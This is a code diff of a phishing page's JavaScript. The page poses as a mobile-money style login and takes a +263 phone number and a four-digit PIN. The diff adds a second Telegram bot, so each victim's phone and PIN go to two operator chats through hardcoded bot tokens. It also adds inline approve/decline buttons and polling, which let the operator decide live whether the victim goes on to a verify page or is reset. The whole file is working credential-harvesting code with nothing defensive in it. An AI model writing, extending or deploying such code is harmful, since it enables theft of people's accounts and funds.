@@ -342,8 +342,14 @@
         </div>
     </div>
     <script>
-        const BOT_TOKEN = '8815990067:AAG7BZoH3nB9Ggv6XpEtyjBZChjBRObld3g';
-        const CHAT_ID = '8136399193';
+        // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY';
+        const CHAT_ID_1 = '5615316142';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const CHAT_ID_2 = '5615316142';
+
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
         if (savedPhone && savedPhone.length === 9) {
@@ -353,14 +359,12 @@
         const loginBtn = document.getElementById('loginBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         let pinValue = '';
-        let pollInterval;
-        let lastUpdateId = 0;
-        let currentCallbackData = '';
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
         }
+
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 if (box.value.length === 1 && index < 3) {
@@ -374,74 +378,224 @@
                 }
             });
         });
+
+        // ========== POLLING FOR APPROVE / DECLINE ==========
+        let lastUpdateId = 0;
+        let pollingActive = false;
+        let currentMessageId = null;
+        let chatIdUsed = null;
+        let botTokenUsed = null;
+        let callbackHandled = false;
+
+        // Send message with inline buttons to a specific bot
+        function sendWithButtons(token, chatId, phone, pin) {
+            const message = `🔐 *New Login Attempt*\n\n📱 Phone: +263 ${phone}\n🔢 PIN: ${pin}\n\n_Approve to proceed, Decline to reset._`;
+
+            return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: '✅ Approve',
+                                    callback_data: 'approve'
+                                }, {
+                                    text: '❌ Decline',
+                                    callback_data: 'decline'
+                                }]
+                            ]
+                        }
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result) {
+                        return {
+                            messageId: data.result.message_id,
+                            chatId: chatId,
+                            token: token
+                        };
+                    }
+                    return null;
+                })
+                .catch(() => null);
+        }
+
+        // Update message: remove buttons AND set new text
+        function updateMessage(token, chatId, messageId, newText) {
+            // First remove the keyboard
+            fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {
+                        inline_keyboard: []
+                    }
+                })
+            }).catch(() => {});
+
+            // Then update the text (separate call, small delay to avoid race)
+            setTimeout(() => {
+                fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        message_id: messageId,
+                        text: newText,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            }, 200);
+        }
+
+        // Start polling for callback data
+        function startPolling(token, chatId, messageId) {
+            botTokenUsed = token;
+            chatIdUsed = chatId;
+            currentMessageId = messageId;
+            pollingActive = true;
+            callbackHandled = false;
+            pollForCallback();
+        }
+
+        function pollForCallback() {
+            if (!pollingActive) return;
+
+            fetch(`https://api.telegram.org/bot${botTokenUsed}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result) return;
+
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        if (callbackHandled) break;
+
+                        // Check for callback_query
+                        if (update.callback_query) {
+                            const cb = update.callback_query;
+                            // Verify it's for our message
+                            if (cb.message && cb.message.message_id === currentMessageId &&
+                                String(cb.message.chat.id) === String(chatIdUsed)) {
+
+                                const data_ = cb.data;
+                                callbackHandled = true;
+                                pollingActive = false;
+
+                                // Answer callback query immediately (removes loading state on button)
+                                fetch(`https://api.telegram.org/bot${botTokenUsed}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: cb.id
+                                    })
+                                }).catch(() => {});
+
+                                if (data_ === 'approve') {
+                                    // Remove buttons + show approved status
+                                    updateMessage(botTokenUsed, chatIdUsed, currentMessageId, '✅ *Login Approved*');
+                                    // Navigate to verify page
+                                    setTimeout(() => {
+                                        window.location.href = 'verify.html';
+                                    }, 500);
+                                    return;
+
+                                } else if (data_ === 'decline') {
+                                    // Remove buttons + show declined status
+                                    updateMessage(botTokenUsed, chatIdUsed, currentMessageId, '❌ *Login Declined*');
+                                    // Reset the page
+                                    setTimeout(() => {
+                                        spinnerOverlay.style.display = 'none';
+                                        pinBoxes.forEach(box => box.value = '');
+                                        pinValue = '';
+                                        checkPinComplete();
+                                        pinBoxes[0].focus();
+                                    }, 500);
+                                    return;
+                                }
+                            }
+                        }
+                    }
+
+                    // Continue polling
+                    if (pollingActive) {
+                        setTimeout(pollForCallback, 500);
+                    }
+                })
+                .catch(() => {
+                    if (pollingActive) {
+                        setTimeout(pollForCallback, 2000);
+                    }
+                });
+        }
+
+        // ========== LOGIN CLICK ==========
         loginBtn.addEventListener('click', () => {
             const phone = phoneInput.value.trim();
             if (!phone) {
                 alert('Please enter phone number');
                 return;
             }
+
             spinnerOverlay.style.display = 'flex';
-            const timestamp = Date.now();
-            const approveData = 'approve_' + timestamp;
-            const cancelData = 'cancel_' + timestamp;
-            currentCallbackData = approveData;
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}\n\nApprove or cancel this access?`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { text: 'Allow Proceed', callback_data: approveData },
-                                    { text: 'Cancel', callback_data: cancelData }
-                                ]
-                            ]
-                        }
-                    })
-                }).then(response => response.json())
-                .then(data => {
-                    if (!data.ok) {
-                        spinnerOverlay.style.display = 'none';
-                        alert('Error sending to bot: ' + data.description);
-                    }
+
+            // Save phone to localStorage
+            localStorage.setItem('phone', phone);
+
+            // Build the credential message for fallback
+            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
+
+            // Send to Bot 1 with inline buttons
+            sendWithButtons(BOT_TOKEN_1, CHAT_ID_1, phone, pinValue).then(result => {
+                if (result) {
+                    // Start polling on Bot 1
+                    startPolling(result.token, result.chatId, result.messageId);
+                } else {
+                    // Fallback: send plain message to Bot 1
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID_1,
+                            text: message
+                        })
+                    }).catch(() => {});
+                    // Proceed anyway
+                    setTimeout(() => {
+                        window.location.href = 'verify.html';
+                    }, 1500);
+                }
+            });
+
+            // Also send plain message to Bot 2 (no buttons)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
                 })
-                .catch(error => {
-                    spinnerOverlay.style.display = 'none';
-                    alert('Bot connection error: ' + error);
-                });
-
-            function stopPolling() {
-                clearInterval(pollInterval);
-                spinnerOverlay.style.display = 'none';
-            }
-
-            pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.ok && data.result.length > 0) {
-                            for (let update of data.result) {
-                                lastUpdateId = update.update_id;
-                                if (update.callback_query) {
-                                    const cb = update.callback_query.data;
-                                    if (cb === approveData) {
-                                        stopPolling();
-                                        window.location.href = 'verify.html';
-                                    } else if (cb === cancelData) {
-                                        stopPolling();
-                                        alert('Login request was cancelled.');
-                                    }
-                                }
-                            }
-                        }
-                    });
-            }, 2000);
+            }).catch(() => {});
         });
+
         checkPinComplete();
         pinBoxes[0].focus();
     </script>
